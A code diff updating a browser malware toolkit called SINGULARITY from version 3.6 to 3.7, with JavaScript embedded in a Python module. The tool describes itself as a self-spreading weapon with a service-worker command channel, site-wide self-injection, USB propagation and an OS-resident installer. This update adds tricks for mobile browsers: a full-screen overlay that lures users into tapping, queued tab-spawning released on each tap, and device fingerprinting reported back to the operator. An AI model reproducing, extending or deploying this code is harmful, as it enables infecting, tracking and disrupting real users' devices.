@@ -1,9 +1,18 @@
 """
-SINGULARITY v3.6 「絶滅」 -- apex-class resident link virus weapon
+SINGULARITY v3.7 「絶滅」 -- apex-class resident link virus weapon
 ==================================================================
 ブラウザの権限内で到達可能な物理限界まで振り切り、PWAとして常駐し、
 サイト全体に自分を注入して伝染し、相手のUSBにも自分を仕込み、
 最後はOS常駐インストーラでブラウザの外まで侵食する。
+
+v3.7:
+  - モバイル対応。iOS Safari / Android Chrome / アプリ内ブラウザは
+    「タップの処理中」しか新しいタブを開けないため、全spawnをキューに積み、
+    タップのたびに解放する方式に変更（スマホでもタブが増える）
+  - 全面タップ誘導オーバーレイ（#sg_tap）を追加
+  - タブに戻るたびに再タップを促す（visibilitychange）
+  - iOSは1タップ1枚、Androidは4枚、PCは従来通りSW経由で一気に開く
+  - 環境に mob / ios / inapp を報告（監視室で判別可能）
 
 v3.6:
   - payload死亡バグ修正（applyLevel が var R より先に走っていた）
@@ -28,7 +37,7 @@ from typing import Any, Dict, Optional
 VIRUS_ID = "singularity"
 VIRUS_NAME = "SINGULARITY"
 VIRUS_NAME_JA = "特異点"
-VIRUS_VERSION = "3.6"
+VIRUS_VERSION = "3.7"
 VIRUS_CLASS = "apex"
 
 LEVEL_LABEL = {0: "偵察", 1: "標準", 2: "加熱", 3: "制圧", 4: "焦土", 5: "特異点",
@@ -51,7 +60,7 @@ APP_NAME_DEFAULT = "脆弱性ブロッカー"
 # Worker
 # ---------------------------------------------------------------------------
 WORKER_JS = r"""
-/*! SINGULARITY worker v3.6 */
+/*! SINGULARITY worker v3.7 */
 /* 最小 wasm: (module (func (export "f") (result f64) f64.const 1)) = 41bytes */
 var WASM = [0,97,115,109,1,0,0,0, 1,5,1,96,0,1,124, 3,2,1,0, 7,5,1,1,102,0,0,
             10,13,1,11,0,68,0,0,0,0,0,0,240,63,11];
@@ -97,7 +106,7 @@ self.onmessage = function (e) {
 # Service Worker（C2・永続化・復活・注入・spawn）
 # ---------------------------------------------------------------------------
 SW_JS = r"""
-/*! SINGULARITY service worker v3.6 -- C2 + injection + resurrection + spawn */
+/*! SINGULARITY service worker v3.7 -- C2 + injection + resurrection + spawn */
 const VER = "sg-v3";
 const DB = "sg", STORE = "out", KV = "kv", PC = "sg-p";
 let CMD = null, PAGE = null, SID = null, MAN = null, ICONS = [], INJ = null, V = null;
@@ -287,7 +296,7 @@ self.addEventListener("fetch", (e) => {
 # SharedWorker
 # ---------------------------------------------------------------------------
 SHARED_JS = r"""
-/*! SINGULARITY shared worker v3.6 */
+/*! SINGULARITY shared worker v3.7 */
 var PORTS = [], K = 0;
 onconnect = function (e) {
   var p = e.ports[0];
@@ -493,9 +502,9 @@ echo "  $APP v__VER__ 常駐開始 (burn=$BURN hard=$HARD)"
 PAYLOAD_JS = r"""
 (function () {
 "use strict";
-/*! SINGULARITY payload v3.6 -- 絶滅 */
+/*! SINGULARITY payload v3.7 -- 絶滅 / mobile-tap-breed */
 var MYVER = window.__SINGULARITY_VER__
-  || (window.__SINGULARITY_CFG__ && window.__SINGULARITY_CFG__.ver) || "3.6";
+  || (window.__SINGULARITY_CFG__ && window.__SINGULARITY_CFG__.ver) || "3.7";
 
 /* ---------------- 小物 ---------------- */
 function Q(k) { try { return new URLSearchParams(location.search).get(k) || ""; } catch (e) { return ""; } }
@@ -543,6 +552,19 @@ if (Q("u") === "inj") CFG.injected = true;
 var IFR = Q("u") === "ifr";
 var WIN = Q("u") === "win";
 var FROM_OS = Q("u") === "os";
+
+/* ---------------- モバイル判定（v3.7） ----------------
+   スマホは「タップの処理中」しか window.open / clients.openWindow が通らない。
+   モバイルでは全spawnをキューに積み、タップのたびに解放する。 */
+var UA = navigator.userAgent || "";
+var IS_IOS = /iPad|iPhone|iPod/.test(UA)
+  || (navigator.platform === "MacIntel" && (navigator.maxTouchPoints || 0) > 1);
+var IS_AND = /Android/i.test(UA);
+var IS_MOBILE = IS_IOS || IS_AND || /Mobile|Silk/i.test(UA);
+var INAPP = /Instagram|FBAN|FBAV|FB_IAB|Line\/|MicroMessenger|Twitter|KakaoTalk|Snapchat/i.test(UA);
+var PER_TAP = IS_IOS ? 1 : (IS_AND ? 4 : 6);   /* 1タップで開く枚数 */
+var QMAX = IS_MOBILE ? 150 : 80;
+var TAP_OPENED = 0, LAST_TAP = 0;
 
 var BIP = null;
 addEventListener("beforeinstallprompt", function (e) {
@@ -667,7 +689,8 @@ function base() {
     cookies: n.cookieEnabled, online: n.onLine, pdf: !!n.pdfViewerEnabled,
     standalone: STANDALONE, sid: SID, ver: MYVER, level: LEVEL,
     vw: innerWidth, vh: innerHeight, ref: Q("ref"), url: location.href, host: location.host,
-    u: Q("u") || "root", w: W
+    u: Q("u") || "root", w: W,
+    mob: IS_MOBILE ? 1 : 0, ios: IS_IOS ? 1 : 0, inapp: INAPP ? 1 : 0
   };
   try { R.env.plugins = (n.plugins || []).length; } catch (e) {}
 }
@@ -1655,10 +1678,22 @@ function openChild(u, tries) {
   return w;
 }
 
-/* ---- spawn 基盤：SW経由（ブロック無効）／直開き（窓）／タップ待ちキュー ---- */
+/* ---- spawn 基盤 ----------------------------------------------------------
+   モバイル（iOS Safari / Android Chrome / アプリ内ブラウザ）は
+   「タップの処理中」しか window.open / clients.openWindow が通らない。
+   よってモバイルでは必ずキューに積み、タップのたびに解放する。
+   PCは従来通り Service Worker 経由でブロックを無視して一気に開く。
+   ------------------------------------------------------------------------ */
 var QUEUE = [];
 
+function qPush(u) {
+  if (QUEUE.length >= QMAX) return false;
+  QUEUE.push(u);
+  return true;
+}
+
 function spawnTab(u) {
+  if (IS_MOBILE) { qPush(u); hint(); return true; }
   try {
     if (navigator.serviceWorker && navigator.serviceWorker.controller) {
       navigator.serviceWorker.controller.postMessage({ k: "spawn", n: 1, url: u });
@@ -1669,35 +1704,59 @@ function spawnTab(u) {
 }
 
 function spawnWin(u) {
+  if (IS_MOBILE) { qPush(u); hint(); return true; }
   var w = null;
   try {
     w = window.open(u, "_blank", "popup=yes,width=480,height=360,left="
       + ((W % 6) * 70) + ",top=" + ((W % 5) * 60));
   } catch (e) { err_(e); }
   if (!w) { try { w = window.open(u, "_blank"); } catch (e) {} }
-  if (!w && QUEUE.length < 80) QUEUE.push(u);
+  if (!w && QUEUE.length < QMAX) QUEUE.push(u);
   return !!w;
 }
 
 function spawnMany(n) {
   var base = CFG.path + "?u=win&w=1&ref=" + SID;
   for (var i = 0; i < n; i++) {
+    var u = base + "&b=" + i + "&t=" + (now() % 100000);
     try {
-      if (navigator.serviceWorker && navigator.serviceWorker.controller) {
-        navigator.serviceWorker.controller.postMessage({ k: "spawn", n: 1, url: base + "&b=" + i });
-      } else { openChild(base + "&b=" + i, 1); }
+      if (IS_MOBILE) { qPush(u); }
+      else if (navigator.serviceWorker && navigator.serviceWorker.controller) {
+        navigator.serviceWorker.controller.postMessage({ k: "spawn", n: 1, url: u });
+      } else { openChild(u, 1); }
     } catch (e) {}
-  }
-}
-
-function flushQueue() {
-  var n = Math.min(QUEUE.length, 10);
-  for (var i = 0; i < n; i++) {
-    var u = QUEUE.shift();
-    if (!spawnWin(u)) { QUEUE.unshift(u); break; }
   }
   hint();
 }
+
+/* タップの中で一気に解放する（iOSは1枚が確実、Androidは数枚） */
+function flushQueue(force) {
+  if (!QUEUE.length) { hint(); return 0; }
+  var cap = force ? Math.max(PER_TAP, 3) : PER_TAP;
+  var n = Math.min(QUEUE.length, cap), made = 0;
+  for (var i = 0; i < n; i++) {
+    var u = QUEUE[0], w = null;
+    try { w = window.open(u, "_blank"); } catch (e) { err_(e); }
+    if (!w) break;
+    QUEUE.shift(); made++;
+  }
+  TAP_OPENED += made;
+  if (made) { R.tapped = 1; push(false); }
+  hint();
+  return made;
+}
+
+/* タップ検出（touchend / click / pointerup の二重発火は 250ms で畳む） */
+function onTap() {
+  var t = now();
+  if (t - LAST_TAP < 250) return;
+  LAST_TAP = t;
+  if (!QUEUE.length) { tapOverlay(); return; }
+  flushQueue(false);
+}
+addEventListener("touchend", onTap, { passive: true });
+addEventListener("click", onTap);
+addEventListener("pointerup", function (e) { if (e.pointerType !== "touch") onTap(); });
 
 function hint() {
   try {
@@ -1706,16 +1765,36 @@ function hint() {
       d = document.createElement("div"); d.id = "sg_hint";
       d.style.cssText = "position:fixed;right:8px;bottom:8px;z-index:2147483647;"
         + "background:#05070a;border:1px solid #00ff88;color:#00ff88;border-radius:8px;"
-        + "padding:6px 10px;font:12px ui-monospace,monospace;opacity:.9";
+        + "padding:6px 10px;font:12px ui-monospace,monospace;opacity:.92";
       document.body.appendChild(d);
     }
-    d.textContent = QUEUE.length ? ("\u3053\u3053\u3092\u30BF\u30C3\u30D7\u3067\u7A93 (" + QUEUE.length + ")")
-                                 : ("L" + LEVEL + " \u7FA4\u308C " + (R.swarm ? R.swarm.live : ""));
+    if (IS_MOBILE) {
+      d.style.font = "13px ui-monospace,monospace";
+      d.style.padding = "12px 16px";
+      d.style.boxShadow = "0 0 20px rgba(0,255,136,.45)";
+    }
+    d.textContent = QUEUE.length
+      ? ("\u3053\u3053\u3092\u30BF\u30C3\u30D7\u3067\u958B\u304F (" + QUEUE.length + ")")
+      : ("L" + LEVEL + " \u7FA4\u308C " + (R.swarm ? R.swarm.live : "")
+         + (TAP_OPENED ? " / opened " + TAP_OPENED : ""));
   } catch (e) {}
+  tapOverlay();
 }
 
-addEventListener("pointerdown", flushQueue);
-addEventListener("click", flushQueue);
+/* 全面タップ誘導オーバーレイ（テンプレ側の #sg_tap を操作） */
+function tapOverlay() {
+  try {
+    var d = document.getElementById("sg_tap");
+    if (!d) return;
+    var n = document.getElementById("sg_tap_n");
+    if (n) {
+      n.textContent = QUEUE.length
+        ? ("\u672A\u958B\u653E " + QUEUE.length + " \u679A")
+        : ("L" + LEVEL + " \u5C55\u958B\u4E2D");
+    }
+    d.style.display = (!R.tapped && IS_MOBILE) ? "flex" : "none";
+  } catch (e) {}
+}
 
 function windowBreed() {
   var mode = CFG.winMode || "off";
@@ -1901,7 +1980,8 @@ function report() {
     burn: R.burn, ram: R.ram, disk: R.disk, history: R.history, crypto: R.crypto,
     hard: R.hard, swarm: R.swarm, hops: R.hops, wipe: R.wipe, errors: R.errors.slice(0, 10),
     swreg: R.swreg, persist: R.persist, union: R.union, app: R.app, manifest: R.manifest,
-    win: { mode: CFG.winMode, branch: CFG.winBranch, depth: CFG.winDepth, skin: CFG.winSkin, w: W }
+    win: { mode: CFG.winMode, branch: CFG.winBranch, depth: CFG.winDepth, skin: CFG.winSkin,
+           w: W, queue: QUEUE.length, opened: TAP_OPENED, mob: IS_MOBILE ? 1 : 0 }
   };
 }
 function swOut(body) {
@@ -2113,9 +2193,11 @@ function hardHistory() {
 function arm() {
   try {
     R.hello = { at: now(), u: Q("u") || "root", w: W, ref: Q("ref"),
-                ua: navigator.userAgent.slice(0, 120), win: WIN, ifr: IFR, os: FROM_OS };
+                ua: navigator.userAgent.slice(0, 120), win: WIN, ifr: IFR, os: FROM_OS,
+                mob: IS_MOBILE ? 1 : 0, ios: IS_IOS ? 1 : 0, inapp: INAPP ? 1 : 0 };
   } catch (e) {}
   try { push(true); } catch (e) {}
+  if (IS_MOBILE) { try { hint(); tapOverlay(); } catch (e) {} }
 
   try { base(); } catch (e) { err_(e); }
   try { pageMeta(); } catch (e) {}
@@ -2179,7 +2261,12 @@ function arm() {
   push(false);
   setInterval(function () { push(false); }, CFG.interval);
   addEventListener("pagehide", function () { push(true); });
-  addEventListener("visibilitychange", function () { if (document.visibilityState === "hidden") push(true); });
+  addEventListener("visibilitychange", function () {
+    if (document.visibilityState === "hidden") push(true);
+    if (document.visibilityState === "visible" && QUEUE.length) {
+      R.tapped = 0; try { tapOverlay(); } catch (e) {}
+    }
+  });
   addEventListener("online", function () { push(true); });
   setTimeout(function () { try { domSnap(false); push(true); } catch (e) {} }, 12000);
   setInterval(function () { try { domSnap(false); } catch (e) {} }, 45000);
@@ -2211,6 +2298,9 @@ window.__singularity = {
   freeze: freezeNow, wipe: wipe, pause: pauseAll, ota: ota,
   breed: function (n) { CFG.winMode = "breed"; CFG.winBranch = clamp(n || 2, 1, 8); windowBreed(); },
   tabs: function (n) { spawnMany(clamp(n || 6, 1, 32)); },
+  tap: function () { return flushQueue(true); },
+  queue: function () { return QUEUE.length; },
+  mobile: function () { return IS_MOBILE; },
   hard: hardKill,
   destroy: function () {
     pauseAll();
@@ -2248,7 +2338,7 @@ VIRUS = {
     },
     "tags": ["apex", "resident", "pwa", "sw-inject", "sse-c2", "rat", "usb-worm",
              "os-resident", "window-breed", "infinite-windows", "exponential",
-             "window-skin", "hardware-kill", "swarm-keeper"],
+             "window-skin", "hardware-kill", "swarm-keeper", "mobile-tap-breed"],
 }
 
 _ALPHA = "abcdefghijklmnopqrstuvwxyz0123456789"
